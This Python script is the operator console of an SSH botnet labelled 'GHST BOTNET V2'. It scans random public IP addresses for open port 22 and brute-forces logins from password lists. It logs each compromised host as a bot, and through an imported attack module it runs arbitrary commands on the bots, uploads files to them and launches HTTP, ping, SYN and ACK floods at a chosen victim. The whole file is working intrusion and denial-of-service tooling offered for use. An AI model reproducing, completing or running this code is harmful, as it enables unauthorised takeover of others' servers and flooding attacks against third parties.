import paramiko
import time
from colorama import *
import random
import socket
import struct
import threading
from threading import Thread
from ataque import load_ataque
from ataque import all_bots
from ataque import list_of_bots
from ataque import select_bot
from ataque import single_bot
from ataque import sftp
from ataque import bots_alive
from ataque import delete_list
from ataque import attack
import os
os.system("clear")

USER=[]
PASS=[]
tbot=0
total_list=0
def botloader():
	while 1:

                    a=IP()

                    if a==False:

                        continue

                    if alive(a) == True:

                        try:

                            conexion(a,option)

                        except:

                            continue
def load(option):

    global total_list

    if option==1:
        with open("passwords.txt","r") as f:
            for line in f:
                USER.append(line.split(":")[0])
                PASS.append(line.strip("\n").split(":")[1])
                total_list+=1
                
    if option==2:
        with open("passwords_small.txt","r") as f:
            for line in f:
                USER.append(line.split(":")[0])
                PASS.append(line.strip("\n").split(":")[1])
                total_list+=1

def conexion(ip, option):

    equipos=open("equipos.txt","a")

    for i in range(total_list):

        try:

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )

            message=ssh.connect(ip, username=USER[i], password=PASS[i], banner_timeout=1000)
            with open(r"equipos.txt", 'r') as fp:
                tbot = len(fp.readlines())
            print(f'\n[ {Fore.GREEN}GHST{Fore.RESET} ] {Fore.GREEN}Rooted:{Fore.RESET} {ip}:22 USER:{USER[i]} PASS={PASS[i]} NEW AMMOUNT OF BOTS: {tbot + 1}\n')

            equipos.write(f'{ip}:{USER[i]}:{PASS[i]}:NS\n')
            equipos.close()

            ssh.close()

            break

        except paramiko.ssh_exception.AuthenticationException:

            print(f'[{Fore.RED} X {Fore.RESET}] Auth ERR IP:{ip} USER:{USER[i]} PASS={PASS[i]}')

        except paramiko.SSHException:

            print(f'[{Fore.RED} X {Fore.RESET}] Device Failed Executing the Command IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
            break

        except socket.error:
            with open(r"equipos.txt", 'r') as fp:
                tbot = len(fp.readlines())
            print(f'\n[{Fore.GREEN} GHST {Fore.RESET}] {Fore.GREEN}Rooted:{Fore.RESET} IP:{ip}:22 USER:{USER[i]} PASS={PASS[i]} NEW AMMOUNT OF BOTS: {tbot + 1}\n')
            equipos.write(f'{ip}:{USER[i]}:{PASS[i]}:NS\n')
            break

        ssh.close()

def IP():

    random_ip=socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    sv=int(random_ip.split(".")[0])
    sb=int(random_ip.split(".")[1])
    while(sv==127 or sv==0 or sv==3 or sv==15 or sv==56 or sv==10 or (sv==192 and sb==168) or (sv == 172 and sb >= 16 and sb < 32) or (sv == 100 and sb >= 64 and sb < 127) or (sv==169 and sb>254) or (sv==198 and sb>= 18 and sb<20) or sv>=224 or sv==6 or sv==7 or sv==11 or sv==21 or sv==22 or sv==26 or sv==28 or sv==29 or sv==30 or sv==33 or sv==55 or sv==214 or sv==215):
        #print(f'[*] IP {random_ip} not valid\n')
        return False
    #print(f'[*] IP {random_ip} valid')
    return random_ip

def alive(ip):
    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    location=(ip,22)
    a_socket.settimeout(0.05)

    result_of_check = a_socket.connect_ex(location)

    if result_of_check == 0:
        print(f"\n{Fore.MAGENTA}[ {Fore.RED}VULN {Fore.MAGENTA}]{Fore.RESET} {ip}:22 Atempting To Infect...\n")
        a_socket.close()
        return True
    else:
        #print(f"    +---> {ip} with Port 22 is not open\n")
        a_socket.close()
        return False

def cls(): print("\n"*20)

def none_bots(bot):
    if bot==0:
        print("\n0 BOTS ONLINE CAN NOT SEND ATTACKS")
        
def tbots():
    with open(r"equipos.txt", 'r') as fp:
        tbot = len(fp.readlines())
    
if __name__ == '__main__':
    while 1:

        load_ataque()
        botzz=bots_alive()
        os.system("clear")
        with open(r"equipos.txt", 'r') as fp:
            tbot = len(fp.readlines())
        

        option=int(input(f'''

           ╔══════════════════════════════════════════════════════╗
           ║     GHST BOTNET V2 || o.BOTS : {botzz} || t.BOTS : {tbot}     ║
           ╠══════════════════════════════════════════════════════╣
           ║  1) Command Execution             2) File Upload     ║
           ║                                                      ║
           ║  3) HTTP/HTTPS Attack             4) PING Attack     ║
           ║                                                      ║
           ║  5) SYN Attack 	               6) ACK Attack      ║
           ║                                                      ║
           ║                    7) Infect More                    ║
           ║                                                      ║
           ╚══════════════════════════════════════════════════════╝

	                     GHSTDEV@ghstnet ~$ '''))

        if option==99:

            load_ataque()
            x=bots_alive()
            none_bots(x)
            delete_list()
            input("\nPress enter to continue...")
            cls()

        if option==1:

            option2=int(input('''
                ╔═════════════════════════════════════════════╗
                ║                                             ║
                ║  1) Execute the commnand in all your bots   ║
                ║                                             ║
                ║  2) Execute a commnand in a single bot      ║
                ║                                             ║
                ╚═════════════════════════════════════════════╝

Select the option: '''))

            if option2==1:
                load_ataque()
                x=bots_alive()
                none_bots(x)
                print("REMEMBER! To concatenate commands just add ; ex( ls;pwd;cd ..;pwd )\n")
                command=input("Select the command that you want to execute in your bots: ")
                see=input("Would you like to see the outputs of the commands ? y/n: ")
                print("")
                all_bots(command, see)
                delete_list()
                input("Press enter to continue...")
                cls()

            if option2==2:

                load_ataque()
                x=bots_alive()
                none_bots(x)
                bot=int(input("\nSelect the number of the bot: "))
                result=select_bot(bot)
                print(f'''\n
Connecting {result[0]}...

REMEMBER! Press exit to leave the device | To concatenate commands just add ; ex( ls;pwd;cd ..;pwd )\n''')

                while 1:
                    command=input(f'{result[1]}@{result[0]}:~#')
                    print("")
                    if command=='exit':
                        break
                    single_bot(command, "y", result[0], result[1], result[2])
                delete_list()
                input("Press enter to continue...")
                cls()

        if option==2:

                load_ataque()
                x=bots_alive()
                none_bots(x)
                bot=int(input("\nSelect the number of the bot: "))
                result=select_bot(bot)

                localpath=input("Write the LOCAL path file ex( /home/user/program.exe or C://User/file.txt ): ")
                remotepath=input("Write the REMOTE path file ex( /tmp/yourfile.sh or /home/car.jpg ): ")

                print(f'\nConnecting and Uploading {localpath} to {result[0]}...\n')
                sftp(result[0], result[1], result[2], remotepath, localpath)
                delete_list()
                input("Press enter to continue...")
                cls()

        if option==3:

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive the the victim's ip: ")
            attack(ip, 1, None, None)
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()

        if option==4:

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive me the victim's ip: ")
            attack(ip, 2, None, None)
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()

        if option==5:

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive me the victim's ip: ")
            port=str(input("Give me the victim's port: "))
            attack(ip, 3, port, "-S")
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()

        if option==6:

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive me the victim's ip: ")
            port=str(input("Give me the victim's port: "))
            attack(ip, 3, port, "-A")
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()

        if option==7:
            os.system("clear")
            option=int(input('''
1) passwords.txt ( 136 combinations, this file goes slower but it has more combos )
2) passwords_small.txt ( 4 combinations, this file goes faster but it has less combos )

Select the option: '''))
            os.system("clear")
            print(f""" 
        {Fore.BLUE}         		╔═╗╦ ╦╔═╗╔╦╗╔╗╔╔═╗╔╦╗ {Fore.RED} ╦  ╔═╗╔═╗╔╦╗╔═╗╦═╗
        {Fore.BLUE}         		║ ╦╠═╣╚═╗ ║ ║║║║╣  ║  {Fore.RED} ║  ║ ║╠═╣ ║║║╣ ╠╦╝
        {Fore.BLUE}         		╚═╝╩ ╩╚═╝ ╩ ╝╚╝╚═╝ ╩  {Fore.RED} ╩═╝╚═╝╩ ╩═╩╝╚═╝╩╚═{Fore.RESET}\n""")
            print(f" 			    [ 5 Bots Scan.MODULE Has Been Started... ]")
            print("\n" + "                               [THIS WILL TAKE TIME TO LOAD BOTS]")
            load(option)
            x1 = threading.Thread(target=botloader)
            x2 = threading.Thread(target=botloader)
            x3 = threading.Thread(target=botloader)
            x4 = threading.Thread(target=botloader)
            x5 = threading.Thread(target=botloader)
            #x6 = threading.Thread(target=botloader)
            #x7 = threading.Thread(target=botloader)
            #x8 = threading.Thread(target=botloader)
            #x9 = threading.Thread(target=botloader)
            #x10 = threading.Thread(target=botloader)
            x1.start()
            x2.start()
            x3.start()
            x4.start()
            x5.start()
            
            while 1:

                    a=IP()

                    if a==False:

                        continue

                    if alive(a) == True:

                        try:

                            conexion(a,option)

                        except:

                            continue

